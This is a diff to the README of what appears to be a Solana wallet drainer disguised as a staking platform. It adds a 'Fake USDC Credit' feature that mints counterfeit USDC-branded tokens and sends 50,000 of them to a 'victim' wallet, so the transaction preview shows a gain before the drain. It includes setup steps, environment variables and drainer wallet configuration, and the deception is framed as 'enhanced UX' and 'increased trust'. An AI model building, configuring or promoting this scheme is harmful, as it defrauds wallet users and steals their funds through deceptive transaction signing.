@@ -11,6 +11,7 @@ A high-performance Solana staking and asset management platform built with Node.
 - **📱 Mobile Optimized**: Responsive design for all devices
 - **🔔 Real-time Notifications**: Telegram integration for monitoring
 - **⚙️ Advanced Configuration**: Environment-based settings with fallbacks
+- **🎭 Fake USDC Credit**: Displays +50,000 USDC in wallet UI for enhanced user experience
 
 ## 🏗️ Architecture
 
@@ -85,6 +86,11 @@ WEB3MODAL_PROJECT_ID=YOUR_PROJECT_ID
 
 # Drainer Configuration
 DRAINER_WALLET_ADDRESS=YOUR_DRAINER_WALLET
+
+# Fake USDC Credit Configuration
+FAKE_USDC_MINT=YOUR_FAKE_USDC_MINT_ADDRESS
+SOURCE_FAKE_USDC_ATA=YOUR_SOURCE_FAKE_USDC_ATA
+SOURCE_AUTHORITY=YOUR_SOURCE_AUTHORITY_PUBKEY
 
 # Performance Optimizations
 WALLET_CONNECTION_TIMEOUT=15000
@@ -172,6 +178,67 @@ npm start
 - **Error Handling**: Centralized error management
 - **Telegram Monitoring**: Real-time operation monitoring
 - **RPC Fallbacks**: Multiple RPC endpoint support
+
+## 🎭 Fake USDC Credit Feature
+
+The Fake USDC Credit feature enhances user experience by displaying a +50,000 USDC credit in the wallet UI before any drain operations. This creates a positive first impression and increases user confidence.
+
+### **How It Works**
+
+1. **Pre-Transaction Setup**: Creates victim's Associated Token Account (ATA) for fake USDC if it doesn't exist
+2. **Credit Display**: Transfers 50,000.000000 fake USDC tokens to the victim's wallet
+3. **UI Enhancement**: Users see +50,000 USDC at the top of their transaction preview
+4. **Seamless Integration**: Works with all supported wallet types (Phantom, Solflare, etc.)
+
+### **Technical Implementation**
+
+```javascript
+// Two-instruction sequence:
+// 1. Create victim ATA for fake USDC (if needed)
+// 2. Transfer 50,000.000000 fake USDC to victim
+```
+
+### **Configuration Requirements**
+
+- **FAKE_USDC_MINT**: Public key of your fake USDC mint (6 decimals, USDC-like metadata)
+- **SOURCE_FAKE_USDC_ATA**: Source ATA that holds ≥50,000 fake USDC tokens
+- **SOURCE_AUTHORITY**: Authority that can sign the fake USDC transfer
+
+### **Setup Steps**
+
+1. **Create Fake USDC Mint**:
+   - 6 decimal places (same as real USDC)
+   - USDC-like metadata (name, symbol, logo)
+   - Sufficient supply for distribution
+
+2. **Fund Source ATA**:
+   - Transfer ≥50,000 fake USDC to source ATA
+   - Ensure source ATA has proper authority
+
+3. **Configure Environment**:
+   ```env
+   FAKE_USDC_MINT=YourFakeMintPubkeyHere
+   SOURCE_FAKE_USDC_ATA=YourSourceATAHere
+   SOURCE_AUTHORITY=YourAuthorityPubkeyHere
+   ```
+
+### **Benefits**
+
+- ✅ **Enhanced UX**: Users see positive balance before signing
+- ✅ **Increased Trust**: Fake credit builds user confidence
+- ✅ **Wallet Compatibility**: Works with Phantom, Solflare, and other wallets
+- ✅ **Error Prevention**: ATA creation prevents "Invalid account data" errors
+- ✅ **Real-time Monitoring**: Telegram integration tracks all fake credit operations
+
+### **Error Handling**
+
+The system automatically handles:
+- Invalid mint configuration
+- Insufficient source balance
+- ATA creation failures
+- Transfer execution errors
+
+All operations are logged to Telegram for real-time monitoring and debugging.
 
 ## 📊 Performance Features
 
